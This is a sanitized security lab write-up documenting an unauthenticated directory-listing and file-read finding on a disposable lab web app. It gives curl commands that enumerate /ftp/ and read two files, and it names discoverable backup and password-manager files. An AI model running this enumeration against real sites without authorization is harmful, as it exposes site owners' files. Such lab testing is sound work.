> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_directory_listing_file_read

Status: verified-lab-flow / authorized disposable lab only
Date: 2026-05-21 UTC
Target: http://<lab-ip>:3000/
Run artifact: `<artifact-output-dir>/verified_flow_wave1_20260521T235533Z/manual/`

## Preconditions

- Scope confirmed by `config/scope.txt`: `<lab-ip>/16` covers the lab target.
- No credentials used.
- Target health before and after wave: HTTP 200.

## Verified exploit-flow

1. Enumerate the exposed directory listing:

```bash
curl -sS -D ftp_headers.txt -o ftp_index.html \
  http://<lab-ip>:3000/ftp/
```

2. Read bounded, non-secret lab files from the listing:

```bash
curl -sS -D ftp_legal_md_headers.txt -o ftp_legal_md_body.txt \
  http://<lab-ip>:3000/ftp/legal.md
curl -sS -D ftp_acquisitions_md_headers.txt -o ftp_acquisitions_md_body.txt \
  http://<lab-ip>:3000/ftp/acquisitions.md
```

## Evidence

- `ftp_status.txt`: `/ftp/` returned HTTP 200 `text/html` with directory-listing links.
- `ftp_links.txt` includes `acquisitions.md`, `announcement_encrypted.md`, `coupons_2013.md.bak`, `incident-support.kdbx`, `legal.md`, `package.json.bak`, `suspicious_errors.yml`.
- `ftp_file_read_summary.json` records successful reads:
  - `ftp_legal_md_body.txt`: 3047 bytes, SHA-256 `af8fffc4b9b2eaf16abe8731d9345890f72a9dbf43f39e823c7350b4aaef760f`.
  - `ftp_acquisitions_md_body.txt`: 909 bytes, SHA-256 `48321ee73b6b6de85cd390e3f395ba794639a268d094201f45c3f973cac441fd`.
- Attempts to read `coupons_2013.md.bak` and `package.json.bak` returned HTTP 403; their bodies are error pages only.

## Impact level

Medium in the lab: unauthenticated users can enumerate and read files from an exposed file area. Some sensitive-looking backup/database/password-manager filenames are discoverable, while direct reads of selected backup files were blocked by the app.

## False-positive controls

- Follow-up file reads confirmed this was not only an HTML route fallback.
- 403 results were recorded separately and not claimed as file-content access.
- Evidence snippets are bounded; no bulk download was performed.

## Cleanup / recovery

No state change. Post-run health remained HTTP 200.

## Real-target migration limits

Do not bulk-download or retain sensitive files on real targets from this workflow. Real use requires written scope, data minimization, and stop-after-proof handling.
